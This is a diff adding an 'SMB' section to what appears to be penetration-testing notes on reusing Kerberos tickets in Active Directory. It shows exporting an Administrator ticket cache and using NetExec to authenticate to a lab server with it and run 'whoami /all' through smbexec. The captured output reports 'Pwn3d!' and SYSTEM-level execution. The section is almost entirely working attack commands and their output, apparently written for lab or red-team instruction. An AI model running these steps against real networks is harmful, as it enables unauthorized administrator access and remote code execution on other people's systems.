@@ -41,6 +41,27 @@ klist
 # Default principal: Administrator@contoso.org
 ```
 
+### SMB
+
+```bash
+export KRB5CCNAME='Administrator@CIFS_win-srv01.sales.contoso.lab@SALES.CONTOSO.LAB.ccache'
+
+nxc smb win-srv01.sales.contoso.lab -u Administrator -k --use-kcache
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-SRV01) (domain:sales.contoso.lab) (signing:False) (SMBv1:True)
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] sales.contoso.lab\Administrator from ccache (Pwn3d!)
+
+nxc smb win-srv01.sales.contoso.lab -u Administrator -k --use-kcache --exec-method smbexec -x 'whoami /all'
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [*] Windows 10 / Server 2016 Build 14393 x64 (name:WIN-SRV01) (domain:sales.contoso.lab) (signing:False) (SMBv1:True)
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] sales.contoso.lab\Administrator from ccache (Pwn3d!)
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        [+] Executed command via smbexec
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        USER INFORMATION
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        ----------------
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        User Name           SID
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        =================== ========
+# SMB         win-srv01.sales.contoso.lab 445    WIN-SRV01        nt authority\system S-1-5-18
+
+```
+
 ### WMI
 
 ```bash
